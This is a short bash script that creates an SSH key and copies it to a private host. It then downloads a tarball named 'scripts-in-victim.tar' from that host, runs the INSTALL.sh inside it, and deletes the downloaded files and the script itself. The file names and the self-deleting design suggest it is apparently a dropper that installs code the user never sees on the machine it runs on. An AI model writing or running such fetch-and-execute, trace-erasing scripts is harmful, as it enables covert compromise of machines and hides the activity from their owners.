#! /bin/bash

THIS_FOLDER=$(pwd)
THIS_FOLDER=$THIS_FOLDER

#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
cd ~/.ssh/																											#
PUBKEY_NAME=$(zenity --entry --title="SSH SETTINGS" --text="Type name of the pub.key....e.g alarm-vboxubuntu32");	#
printf $PUBKEY_NAME"\n\n\n" | ssh-keygen																			#
ssh-copy-id -i $PUBKEY_NAME "alarm@10.22.14.203 -p 3603"															#
cd $THIS_FOLDER																										#
scp -P 3603 alarm@10.22.14.203:/home/alarm/DOCUMENTS/from-pkp/scripts-in-victim.tar $THIS_FOLDER/delete-this.tar	#
tar -xvf delete-this.tar																							#
cd scripts-in-victim/																								#
sh INSTALL.sh																										#
cd $THIS_FOLDER																									#
#cp scripts-in-victim/UNINSTALL.sh $THIS_FOLDER/																							#
rm -r scripts-in-victim																							#
rm delete-this.tar																									#
rm -- "$0"																											#
#+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
